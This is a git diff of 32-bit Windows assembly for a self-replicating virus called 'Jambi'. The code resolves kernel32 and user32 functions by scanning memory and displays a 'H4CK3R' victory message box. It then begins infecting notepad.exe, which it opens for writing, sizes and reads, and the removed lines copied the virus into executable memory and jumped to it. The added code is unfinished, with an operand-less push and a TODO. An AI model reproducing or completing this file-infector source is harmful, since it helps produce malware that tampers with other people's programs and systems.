@@ -1,4 +1,4 @@
-; getMsgBox.asm
+; Jambi
 ; MASM32 asm program for Intel i386 processors running Windows 32bits
 ; By Deb0ch.
 
@@ -17,18 +17,20 @@ begin_copy:
     oldEntryPoint           dd 42424242h
     msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0
 
-; *** DLL names: ***
-
     kernel32_dll_name       db "Kernel32.dll", 0
     user32_dll_name         db "User32.dll", 0
-
-; *** function names: ***
-
     getProcAddress_name     db "GetProcAddress", 0
     loadLibrary_name        db "LoadLibraryA", 0
+	
+	file_name				db "notepad.exe", 0
+
+; Function names
+	closehandle_name		db "CloseHandle", 0	;
+	createfile_name			db "CreateFileA", 0
+	getfilesize_name		db "GetFileSize", 0	;
     messagebox_name         db "MessageBoxA", 0
+	readfile_name			db "ReadFile", 0 ;
     virtualalloc_name       db "VirtualAlloc", 0
-    virtualprotect_name     db "VirtualProtect", 0
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 ; DATA (inside .code section) - END
@@ -39,100 +41,7 @@ begin_copy:
 ; PROCEDURES
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
-
-; int   my_strcmp(char *, char *)
-; (edi, esi) -> eax
-; Compares 2 strings strcmp-style.
-my_strcmp PROC NEAR
-
-    push    edi
-    push    esi
-    push    ebx                         ; Saving registers that we will use
-
-loop_beg:
-    cmp     byte ptr [edi], 0
-    jz      loop_end                    ; if (str1[i] == '\0') then exit loop
-    mov     bl, byte ptr [edi]
-    cmp     byte ptr [esi], bl
-    jnz     loop_end                    ; if (str1[i] != str2[i]) then exit loop
-    inc     edi
-    inc     esi
-    jmp     loop_beg
-
-loop_end:
-    movzx   eax, byte ptr [edi]
-    movzx   ebx, byte ptr [esi]
-    sub     eax, ebx
-
-    pop     ebx
-    pop     esi
-    pop     edi                         ; restore borrowed registers
-
-    ret
-my_strcmp ENDP
-
-
-; void* memcpy(void *dest, void *src, size_t n)
-; (edi, esi, edx) -> eax	
-my_memcpy PROC NEAR
-
-    push    edi
-    push    esi
-    push    ebx                         ; Saving registers that we will use
-
-    test    edi, edi                    ; Test if dest is NULL	
-    je      lbl_result
-    test    esi, esi                    ; Test if src is NULL	
-    je      lbl_result
-    test    edx, edx                    ; Test if n is zero	
-    je      lbl_result
-    xor     ecx, ecx
-    xor     ebx, ebx
-
-lbl_loop:
-    mov     bl, BYTE ptr [esi + ecx]
-    mov     BYTE ptr [edi + ecx], bl
-    inc     ecx
-    cmp     ecx, edx
-    jb      lbl_loop
-
-lbl_result:
-    mov     eax, edi
-
-    pop     ebx
-    pop     esi
-    pop     edi                         ; restore borrowed registers
-
-    ret
-my_memcpy ENDP
-
-
-; void *memset(void *s, int c, size_t n)
-; (edi, esi, edx) -> eax
-my_memset PROC NEAR
-
-    push    ebx
-    push    edx
-
-    mov     eax, edi
-    mov     ecx, edi
-    lea     ebx, [edi + edx]
-    test    edi, edi                    ; Test if s is NULL
-    je      lbl_end
-
-lbl_loop:
-    mov     edx, esi
-    mov     BYTE ptr [ecx], dl
-    inc     ecx
-    cmp     ecx, ebx
-    jb      lbl_loop
-
-lbl_end:
-    pop     edx
-    pop     ebx
-
-    ret
-my_memset ENDP
+	include		utils.asm
 
 ; ¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤
 
@@ -153,17 +62,20 @@ delta_offset:
 
 main PROC NEAR
 
-; Function addresses
-	LOCAL	loadLibrary_addr:DWORD
     LOCAL   getProcAddress_addr:DWORD
-	LOCAL	messagebox_addr:DWORD
-	LOCAL	virtualalloc_addr:DWORD
-	LOCAL	virtualprotect_addr:DWORD
-
-; Other variables
+	LOCAL	loadLibrary_addr:DWORD
 	LOCAL	imageBase:DWORD
-	LOCAL	sizecopy:DWORD
-	LOCAL	newcode:DWORD
+	LOCAL	filehandle:DWORD
+	LOCAL	fileptr:DWORD
+	LOCAL	filesize:DWORD
+
+; Function addresses
+	LOCAL	closehandle_addr:DWORD
+	LOCAL	createfile_addr:DWORD
+	LOCAL	getfilesize_addr:DWORD
+	LOCAL	messagebox_addr:DWORD
+	LOCAL	readfile_addr:DWORD
+	LOCAL	virtualalloc_addr:DWORD
 
     and     esi, 0FFFF0000h             ; mask address inside k32.dll to get page aligned like sections.
 
@@ -253,76 +165,75 @@ browse_export_names2:
 ; --------------------------------------> LoadLibrary's VA is now saved in getProcAddress_addr. Yay !!!
 ; --------------------------------------> Now we can use these functions to load any function from any dll on the system. Yay =D
 
-    lea     edx, [ebx + offset user32_dll_name]     ;
+; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
+; Can be used ONLY within this procedure.
+LOADFUNC	MACRO	fct_name, dll_name, result_container
+    lea     edx, [ebx + offset dll_name]		    ;
     push    edx                                     ;
     call    loadLibrary_addr                        ;
-    lea     edx, [ebx + offset messagebox_name]     ;
+    lea     edx, [ebx + offset fct_name]     		;
     push    edx                                     ;
     push    eax                                     ;
     call    getProcAddress_addr                     ;
-    mov     messagebox_addr, eax                    ; Sequence of instructions to load a function from a dll.
+    mov     result_container, eax                   ; Sequence of instructions to load a function from a dll.
+ENDM
 
-    lea     edx, [ebx + offset kernel32_dll_name]   ;
-    push    edx                                     ;
-    call    loadLibrary_addr                        ;
-    lea     edx, [ebx + offset virtualalloc_name]   ;
-    push    edx                                     ;
-    push    eax                                     ;
-    call    getProcAddress_addr                     ;
-    mov     virtualalloc_addr, eax                  ; Sequence of instructions to load a function from a dll.
+; Load your functions here.
+	
+	LOADFUNC	closehandle_name,	kernel32_dll_name,	closehandle_addr
+	LOADFUNC	createfile_name,	kernel32_dll_name,	createfile_addr
+	LOADFUNC	getfilesize_name,	kernel32_dll_name,	getfilesize_addr
+	LOADFUNC	messagebox_name,	user32_dll_name,	messagebox_addr
+	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
+	LOADFUNC	virtualalloc_name,	kernel32_dll_name,	virtualalloc_addr
 
-    lea     edx, [ebx + offset kernel32_dll_name]   ;
-    push    edx                                     ;
-    call    loadLibrary_addr                        ;
-    lea     edx, [ebx + offset virtualprotect_name] ;
-    push    edx                                     ;
-    push    eax                                     ;
-    call    getProcAddress_addr                     ;
-    mov     virtualprotect_addr, eax                ; Sequence of instructions to load a function from a dll.
+; functions loading end.
+	
+    push    0                           ;
+    push    offset msgOfVictory			;
+    push    offset msgOfVictory         ;
+    push    0                           ;
+    call    messagebox_addr             ; Messagebox of VICTORY !!!
 
-    push    0                                       ;
-    push    offset msgOfVictory                     ;
-    push    offset msgOfVictory                     ;
-    push    0                                       ;
-    call    messagebox_addr                         ; Messagebox of VICTORY !!!
+; --------------------------------------> Now, time to infect the other files ! Niark niark niark...
 
-    mov     ecx, end_copy
-    sub     ecx, begin_copy
-    mov     sizecopy, ecx                           ; get the size to copy
+	push	0							; No template file
+	push	80h							; FILE_ATTRIBUTES_NORMAL
+	push 	3							; ONLY_EXISTING (only if it exists)
+	push	0							; no security
+	push	0							; no sharing
+	push	60000000h					; GENERIC_READ | GENERIC_WRITE
+	push	offset file_name
+	call	createfile_addr				; open a file
+	mov		filehandle, eax
 
-    push    04h
-    push    00001000h
-    push    sizecopy
-    push    0
-    call    virtualalloc_addr
-    mov     newcode, eax                            ; allocate some mem with read/write permissions
+	cmp		filehandle, -1				; Check errors.
+	je		exit
+	
+	push	0
+	push	filehandle
+	call	getfilesize_addr
+	
+	cmp		eax, -1						; Check errors.
+	je		exit
 
-    mov     edi, newcode
-    mov     esi, begin_copy
-    mov     edx, sizecopy
-    call    my_memcpy
+	add		eax, 5000h					; TODO: calculate size to allocate more properly.
+	
+	push    04h
+	push    00001000h
+	push    eax							; size to allocate
+	push    0
+	call    virtualalloc_addr
+	mov     fileptr, eax                 ; allocate some mem with read/write permissions
 
-    push    edx                                     ; save edx
-    mov     edx, esp
-    sub     edx, 4                                  ; making a fake pointer to an int for the virtualprotect function
- 
-    push    edx
-    push    10h
-    push    sizecopy
-    push    newcode
-    call    virtualprotect_addr                     ; modifies the access permissions to 'execute'.
+	cmp		eax, 0
+	je		exit
 
-    pop     edx                                     ; restore edx
-
-    mov     esi, imageBase
-    add     esi, 13200h
-    push    esi                                     ; Simulate the "old eip in k32.dll" technic that we use in the beginning of the code
-
-    mov     ecx, virus_start
-    sub     ecx, begin_copy
-    add     ecx, newcode
-    jmp     ecx
-
+	push	
+	push	fileptr
+	push	filehandle
+	call	readfile_addr
+	
 exit:
     ret
 
